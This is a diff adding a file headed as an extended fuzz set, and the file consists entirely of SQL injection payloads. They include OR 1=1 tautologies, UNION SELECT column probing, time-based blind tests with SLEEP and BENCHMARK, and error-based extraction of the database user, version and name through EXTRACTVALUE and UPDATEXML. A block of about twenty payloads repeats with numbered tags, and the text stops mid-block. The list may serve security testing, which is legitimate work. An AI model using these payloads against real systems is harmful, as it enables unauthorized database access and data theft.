@@ -1,0 +1,251 @@
+# Extended fuzz union and error set (250)
+' OR 1=1-- fuzz26
+' OR '1'='1' /*f26*/
+' AND 1=2 UNION SELECT NULL-- f26
+' AND SLEEP(2)-- t26
+' OR IF(26=26,SLEEP(2),0)-- if26
+') OR ('x'='x'-- p26
+" OR "1"="1" -- dq26
+') UNION SELECT CONCAT(0x7e,USER(),0x7e)-- u26
+' ORDER BY 3-- ob26
+' GROUP BY 9 HAVING 1=1-- gb26
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- ex26
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- ux26
+' UNION SELECT NULL,NULL,NULL-- us26
+' UNION ALL SELECT NULL,NULL,NULL,NULL-- ua26
+' AND (SELECT COUNT(*) FROM information_schema.tables)>5-- is26
+' OR EXISTS(SELECT 1 FROM information_schema.columns)-- ie26
+1 OR 1=1# int26
+-1 UNION SELECT NULL-- neg26
+' OR BENCHMARK(100000,MD5(26))-- bm26
+' AND (SELECT 26 FROM (SELECT(SLEEP(1)))a)-- ts26
+' OR 1=1-- fuzz27
+' OR '1'='1' /*f27*/
+' AND 1=2 UNION SELECT NULL-- f27
+' AND SLEEP(3)-- t27
+' OR IF(27=27,SLEEP(2),0)-- if27
+') OR ('x'='x'-- p27
+" OR "1"="1" -- dq27
+') UNION SELECT CONCAT(0x7e,USER(),0x7e)-- u27
+' ORDER BY 4-- ob27
+' GROUP BY 1 HAVING 1=1-- gb27
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- ex27
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- ux27
+' UNION SELECT NULL,NULL,NULL-- us27
+' UNION ALL SELECT NULL,NULL,NULL,NULL-- ua27
+' AND (SELECT COUNT(*) FROM information_schema.tables)>6-- is27
+' OR EXISTS(SELECT 1 FROM information_schema.columns)-- ie27
+1 OR 1=1# int27
+-1 UNION SELECT NULL-- neg27
+' OR BENCHMARK(100000,MD5(27))-- bm27
+' AND (SELECT 27 FROM (SELECT(SLEEP(1)))a)-- ts27
+' OR 1=1-- fuzz28
+' OR '1'='1' /*f28*/
+' AND 1=2 UNION SELECT NULL-- f28
+' AND SLEEP(4)-- t28
+' OR IF(28=28,SLEEP(2),0)-- if28
+') OR ('x'='x'-- p28
+" OR "1"="1" -- dq28
+') UNION SELECT CONCAT(0x7e,USER(),0x7e)-- u28
+' ORDER BY 5-- ob28
+' GROUP BY 2 HAVING 1=1-- gb28
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- ex28
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- ux28
+' UNION SELECT NULL,NULL,NULL-- us28
+' UNION ALL SELECT NULL,NULL,NULL,NULL-- ua28
+' AND (SELECT COUNT(*) FROM information_schema.tables)>0-- is28
+' OR EXISTS(SELECT 1 FROM information_schema.columns)-- ie28
+1 OR 1=1# int28
+-1 UNION SELECT NULL-- neg28
+' OR BENCHMARK(100000,MD5(28))-- bm28
+' AND (SELECT 28 FROM (SELECT(SLEEP(1)))a)-- ts28
+' OR 1=1-- fuzz29
+' OR '1'='1' /*f29*/
+' AND 1=2 UNION SELECT NULL-- f29
+' AND SLEEP(5)-- t29
+' OR IF(29=29,SLEEP(2),0)-- if29
+') OR ('x'='x'-- p29
+" OR "1"="1" -- dq29
+') UNION SELECT CONCAT(0x7e,USER(),0x7e)-- u29
+' ORDER BY 6-- ob29
+' GROUP BY 3 HAVING 1=1-- gb29
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- ex29
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- ux29
+' UNION SELECT NULL,NULL,NULL-- us29
+' UNION ALL SELECT NULL,NULL,NULL,NULL-- ua29
+' AND (SELECT COUNT(*) FROM information_schema.tables)>1-- is29
+' OR EXISTS(SELECT 1 FROM information_schema.columns)-- ie29
+1 OR 1=1# int29
+-1 UNION SELECT NULL-- neg29
+' OR BENCHMARK(100000,MD5(29))-- bm29
+' AND (SELECT 29 FROM (SELECT(SLEEP(1)))a)-- ts29
+' OR 1=1-- fuzz30
+' OR '1'='1' /*f30*/
+' AND 1=2 UNION SELECT NULL-- f30
+' AND SLEEP(1)-- t30
+' OR IF(30=30,SLEEP(2),0)-- if30
+') OR ('x'='x'-- p30
+" OR "1"="1" -- dq30
+') UNION SELECT CONCAT(0x7e,USER(),0x7e)-- u30
+' ORDER BY 7-- ob30
+' GROUP BY 4 HAVING 1=1-- gb30
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- ex30
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- ux30
+' UNION SELECT NULL,NULL,NULL-- us30
+' UNION ALL SELECT NULL,NULL,NULL,NULL-- ua30
+' AND (SELECT COUNT(*) FROM information_schema.tables)>2-- is30
+' OR EXISTS(SELECT 1 FROM information_schema.columns)-- ie30
+1 OR 1=1# int30
+-1 UNION SELECT NULL-- neg30
+' OR BENCHMARK(100000,MD5(30))-- bm30
+' AND (SELECT 30 FROM (SELECT(SLEEP(1)))a)-- ts30
+' OR 1=1-- fuzz31
+' OR '1'='1' /*f31*/
+' AND 1=2 UNION SELECT NULL-- f31
+' AND SLEEP(2)-- t31
+' OR IF(31=31,SLEEP(2),0)-- if31
+') OR ('x'='x'-- p31
+" OR "1"="1" -- dq31
+') UNION SELECT CONCAT(0x7e,USER(),0x7e)-- u31
+' ORDER BY 8-- ob31
+' GROUP BY 5 HAVING 1=1-- gb31
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- ex31
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- ux31
+' UNION SELECT NULL,NULL,NULL-- us31
+' UNION ALL SELECT NULL,NULL,NULL,NULL-- ua31
+' AND (SELECT COUNT(*) FROM information_schema.tables)>3-- is31
+' OR EXISTS(SELECT 1 FROM information_schema.columns)-- ie31
+1 OR 1=1# int31
+-1 UNION SELECT NULL-- neg31
+' OR BENCHMARK(100000,MD5(31))-- bm31
+' AND (SELECT 31 FROM (SELECT(SLEEP(1)))a)-- ts31
+' OR 1=1-- fuzz32
+' OR '1'='1' /*f32*/
+' AND 1=2 UNION SELECT NULL-- f32
+' AND SLEEP(3)-- t32
+' OR IF(32=32,SLEEP(2),0)-- if32
+') OR ('x'='x'-- p32
+" OR "1"="1" -- dq32
+') UNION SELECT CONCAT(0x7e,USER(),0x7e)-- u32
+' ORDER BY 9-- ob32
+' GROUP BY 6 HAVING 1=1-- gb32
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- ex32
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- ux32
+' UNION SELECT NULL,NULL,NULL-- us32
+' UNION ALL SELECT NULL,NULL,NULL,NULL-- ua32
+' AND (SELECT COUNT(*) FROM information_schema.tables)>4-- is32
+' OR EXISTS(SELECT 1 FROM information_schema.columns)-- ie32
+1 OR 1=1# int32
+-1 UNION SELECT NULL-- neg32
+' OR BENCHMARK(100000,MD5(32))-- bm32
+' AND (SELECT 32 FROM (SELECT(SLEEP(1)))a)-- ts32
+' OR 1=1-- fuzz33
+' OR '1'='1' /*f33*/
+' AND 1=2 UNION SELECT NULL-- f33
+' AND SLEEP(4)-- t33
+' OR IF(33=33,SLEEP(2),0)-- if33
+') OR ('x'='x'-- p33
+" OR "1"="1" -- dq33
+') UNION SELECT CONCAT(0x7e,USER(),0x7e)-- u33
+' ORDER BY 10-- ob33
+' GROUP BY 7 HAVING 1=1-- gb33
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- ex33
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- ux33
+' UNION SELECT NULL,NULL,NULL-- us33
+' UNION ALL SELECT NULL,NULL,NULL,NULL-- ua33
+' AND (SELECT COUNT(*) FROM information_schema.tables)>5-- is33
+' OR EXISTS(SELECT 1 FROM information_schema.columns)-- ie33
+1 OR 1=1# int33
+-1 UNION SELECT NULL-- neg33
+' OR BENCHMARK(100000,MD5(33))-- bm33
+' AND (SELECT 33 FROM (SELECT(SLEEP(1)))a)-- ts33
+' OR 1=1-- fuzz34
+' OR '1'='1' /*f34*/
+' AND 1=2 UNION SELECT NULL-- f34
+' AND SLEEP(5)-- t34
+' OR IF(34=34,SLEEP(2),0)-- if34
+') OR ('x'='x'-- p34
+" OR "1"="1" -- dq34
+') UNION SELECT CONCAT(0x7e,USER(),0x7e)-- u34
+' ORDER BY 11-- ob34
+' GROUP BY 8 HAVING 1=1-- gb34
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- ex34
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- ux34
+' UNION SELECT NULL,NULL,NULL-- us34
+' UNION ALL SELECT NULL,NULL,NULL,NULL-- ua34
+' AND (SELECT COUNT(*) FROM information_schema.tables)>6-- is34
+' OR EXISTS(SELECT 1 FROM information_schema.columns)-- ie34
+1 OR 1=1# int34
+-1 UNION SELECT NULL-- neg34
+' OR BENCHMARK(100000,MD5(34))-- bm34
+' AND (SELECT 34 FROM (SELECT(SLEEP(1)))a)-- ts34
+' OR 1=1-- fuzz35
+' OR '1'='1' /*f35*/
+' AND 1=2 UNION SELECT NULL-- f35
+' AND SLEEP(1)-- t35
+' OR IF(35=35,SLEEP(2),0)-- if35
+') OR ('x'='x'-- p35
+" OR "1"="1" -- dq35
+') UNION SELECT CONCAT(0x7e,USER(),0x7e)-- u35
+' ORDER BY 12-- ob35
+' GROUP BY 9 HAVING 1=1-- gb35
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- ex35
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- ux35
+' UNION SELECT NULL,NULL,NULL-- us35
+' UNION ALL SELECT NULL,NULL,NULL,NULL-- ua35
+' AND (SELECT COUNT(*) FROM information_schema.tables)>0-- is35
+' OR EXISTS(SELECT 1 FROM information_schema.columns)-- ie35
+1 OR 1=1# int35
+-1 UNION SELECT NULL-- neg35
+' OR BENCHMARK(100000,MD5(35))-- bm35
+' AND (SELECT 35 FROM (SELECT(SLEEP(1)))a)-- ts35
+' OR 1=1-- fuzz36
+' OR '1'='1' /*f36*/
+' AND 1=2 UNION SELECT NULL-- f36
+' AND SLEEP(2)-- t36
+' OR IF(36=36,SLEEP(2),0)-- if36
+') OR ('x'='x'-- p36
+" OR "1"="1" -- dq36
+') UNION SELECT CONCAT(0x7e,USER(),0x7e)-- u36
+' ORDER BY 1-- ob36
+' GROUP BY 1 HAVING 1=1-- gb36
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- ex36
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- ux36
+' UNION SELECT NULL,NULL,NULL-- us36
+' UNION ALL SELECT NULL,NULL,NULL,NULL-- ua36
+' AND (SELECT COUNT(*) FROM information_schema.tables)>1-- is36
+' OR EXISTS(SELECT 1 FROM information_schema.columns)-- ie36
+1 OR 1=1# int36
+-1 UNION SELECT NULL-- neg36
+' OR BENCHMARK(100000,MD5(36))-- bm36
+' AND (SELECT 36 FROM (SELECT(SLEEP(1)))a)-- ts36
+' OR 1=1-- fuzz37
+' OR '1'='1' /*f37*/
+' AND 1=2 UNION SELECT NULL-- f37
+' AND SLEEP(3)-- t37
+' OR IF(37=37,SLEEP(2),0)-- if37
+') OR ('x'='x'-- p37
+" OR "1"="1" -- dq37
+') UNION SELECT CONCAT(0x7e,USER(),0x7e)-- u37
+' ORDER BY 2-- ob37
+' GROUP BY 2 HAVING 1=1-- gb37
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- ex37
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- ux37
+' UNION SELECT NULL,NULL,NULL-- us37
+' UNION ALL SELECT NULL,NULL,NULL,NULL-- ua37
+' AND (SELECT COUNT(*) FROM information_schema.tables)>2-- is37
+' OR EXISTS(SELECT 1 FROM information_schema.columns)-- ie37
+1 OR 1=1# int37
+-1 UNION SELECT NULL-- neg37
+' OR BENCHMARK(100000,MD5(37))-- bm37
+' AND (SELECT 37 FROM (SELECT(SLEEP(1)))a)-- ts37
+' OR 1=1-- fuzz38
+' OR '1'='1' /*f38*/
+' AND 1=2 UNION SELECT NULL-- f38
+' AND SLEEP(4)-- t38
+' OR IF(38=38,SLEEP(2),0)-- if38
+') OR ('x'='x'-- p38
+" OR "1"="1" -- dq38
+') UNION SELECT CONCAT(0x7e,USER(),0x7e)-- u38
+' ORDER BY 3-- ob38
+' GROUP BY 3 HAVING 1=1-- gb38
